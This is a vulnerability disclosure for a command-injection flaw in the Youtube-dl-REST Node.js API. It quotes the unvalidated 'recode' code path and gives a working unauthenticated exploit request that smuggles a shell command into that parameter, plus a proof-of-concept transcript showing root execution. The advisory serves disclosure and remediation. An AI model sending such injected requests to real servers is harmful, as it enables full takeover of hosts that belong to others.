# VDR-022: Unauthenticated OS Command Injection via `recode` in develon2015/Youtube-dl-REST

- **Target**: [develon2015/Youtube-dl-REST](https://github.com/develon2015/Youtube-dl-REST)
- **Severity**: Critical (CVSS 3.1: 9.8)
- **CWE**: [CWE-78](https://cwe.mitre.org/data/definitions/78.html) - OS Command Injection
- **CVE**: [CVE-2026-51091](https://www.cve.org/CVERecord?id=CVE-2026-51091)
- **CVSS Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Discovered**: 2026-04-14
- **Researcher**: Dennis Sepede - [Securitix Solutions](https://securitixsolutions.com)

## Summary

`Youtube-dl-REST` is an Express (Node.js) REST wrapper around `yt-dlp`. The `GET /y2b/download` endpoint builds a shell command string by interpolating the client-supplied `recode` query parameter **unquoted** and runs it with `child_process.execSync()`. Every other query parameter (`v`, `p`, `format`, `subs`) is validated with a regular expression; `recode` has **no validation** in the default (non-demo) mode. An unauthenticated remote attacker can therefore inject arbitrary shell metacharacters through `recode` and execute OS commands on the server.

A working proof of concept was executed against the **genuine, unmodified application** running under Node 20 on Linux. A single unauthenticated HTTP GET caused the injected command `id` to run server-side, producing `uid=0(root) gid=0(root) groups=0(root)`.

## Affected Component

- **Product**: Youtube-dl-REST (REST API wrapper for yt-dlp)
- **Version / branch**: `node` branch
- **Commit**: `7707808` (2025-12-07)
- **Vulnerable file**: `index.js`
- **Endpoint**: `GET /y2b/download`

### Missing validation - `index.js:105-116`

```js
let { website, v, p, format, recode, subs } = req.query;
if (!!!v.match(/^[\w-]{11,14}$/) && ...) return res.send({error...});   // v validated
if (p && !!!p.match(/^[\d]+$/))          return res.send({error...});   // p validated
if (!!!format.match(/^([\w\d-]+)...$/))  return res.send({error...});   // format validated
if (config.mode === '演示模式' && !!recode) return res.send({error...});  // recode allowed unless demo mode
// recode has NO character validation
```

`config.json` ships with `"mode": "非演示模式..."` (non-demo), so `recode` is passed through unvalidated by default.

### Sink - `index.js:456-463` (worker thread)

```js
let cmd =
    `yt-dlp  ${config.cookie !== undefined ? `--cookies ${config.cookie}` : ''} ${getWebsiteUrl(website, videoID, p)} -f ${format.replace('x', '+')} ` +
    `-o '${fullpath}/${videoID}.%(ext)s' ${recode !== undefined ? `--recode ${recode}` : ''} -k --write-info-json`;
// ...
let ps = child_process.execSync(cmd).toString().split('\n');   // SINK
```

`recode` is concatenated into `--recode ${recode}` with no quoting or escaping, and `cmd` is executed by `execSync()`, which runs it through `/bin/sh -c`. Any shell metacharacter in `recode` is interpreted by the shell.

## Details

`child_process.execSync(cmd)` runs `cmd` via the system shell. A `recode` value such as `mp4;id>/tmp/PWNED;true` turns the command into `... --recode mp4;id>/tmp/PWNED;true -k ...`, where the `;id>/tmp/PWNED` clause executes independently of `yt-dlp`. The injection succeeds even when `yt-dlp` is absent or fails, because the shell evaluates the whole line. No authentication is required to reach the endpoint.

## Proof of Concept

The PoC runs the **genuine, unmodified `index.js`** as an Express server in an isolated `node:20-slim` container (default `config.json`, only `express` installed). It then sends one unauthenticated HTTP GET. The transcript includes the genuine handler/sink source read from the checked-out tree and the genuine `console.log` of the constructed command, showing the injection landing in the shell string.

### Exploit request

```
GET /y2b/download?website=y2b&v=dQw4w9WgXcQ&format=18&recode=mp4;id>/tmp/PWNED_YTDLREST 2>&1;true
```
(`recode` URL-encoded)

### Captured transcript (`poc/OUTPUT.txt`, excerpt)

```
== unauthenticated request: GET /y2b/download with injected recode ==
recode = mp4;id>/tmp/PWNED_YTDLREST 2>&1;true
{"success":true,"result":{"v":"dQw4w9WgXcQ","downloading":true,...}}

== constructed shell command (genuine console.log, index.js:461) ==
下载视频, 命令: yt-dlp  --cookies cookies.txt https://youtu.be/dQw4w9WgXcQ -f 18 -o '/app/tmp/dQw4w9WgXcQ/18/dQw4w9WgXcQ.%(ext)s' --recode mp4;id>/tmp/PWNED_YTDLREST 2>&1;true -k --write-info-json

== server-side proof: sentinel written by injected 'id' ==
uid=0(root) gid=0(root) groups=0(root)

[PROVEN] OS command injection via recode -> child_process.execSync
```

The constructed command shows the attacker's `;id>...;` clause spliced into the shell string, and the sentinel - the genuine output of `id` - proves the command executed server-side as `root`. The runnable exploit is `poc/run.sh`; the full transcript is `poc/OUTPUT.txt`.

## Impact

An unauthenticated remote attacker who can reach the service executes arbitrary OS commands in the context of the Node.js process (observed as `root` in the PoC): full compromise of confidentiality, integrity and availability of the host, persistence, and internal pivoting. The endpoint is unauthenticated and the server binds to `0.0.0.0` by default; a single GET request suffices. CVSS 3.1 base score **9.8 (Critical)**, vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`.

Multiple other `execSync()` call sites in `index.js` build command strings from request-derived values and share the same unsafe pattern; they should be remediated together.

## Recommendation

1. **Do not build shell strings from user input.** Replace `execSync(cmd)` with `execFile`/`spawn` and pass `yt-dlp` arguments as an array (`spawn('yt-dlp', ['--recode', recode, ...])`), so no argument can be interpreted by a shell.
2. **Validate `recode`** against a strict allowlist of supported container formats (e.g. `mp4`, `mkv`, `webm`), the same way `v`, `p` and `format` are already validated.
3. **Add authentication** to the API and **bind to `127.0.0.1`** unless remote access is required.
4. **Run the service as an unprivileged user.**

## Status

| Date | Event |
|------|-------|
| 2026-04-14 | Vulnerability reported to MITRE CNA-LR (request 2025339, source-code audit) |
| 2026-07-01 | CVE-2026-51091 assigned by MITRE (RESERVED) |
| 2026-07-02 | Working end-to-end PoC executed against the genuine Express application |

## References

- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
- [Upstream repository](https://github.com/develon2015/Youtube-dl-REST)
- [Node.js `child_process.execSync` documentation](https://nodejs.org/api/child_process.html#child_processexecsynccommand-options)
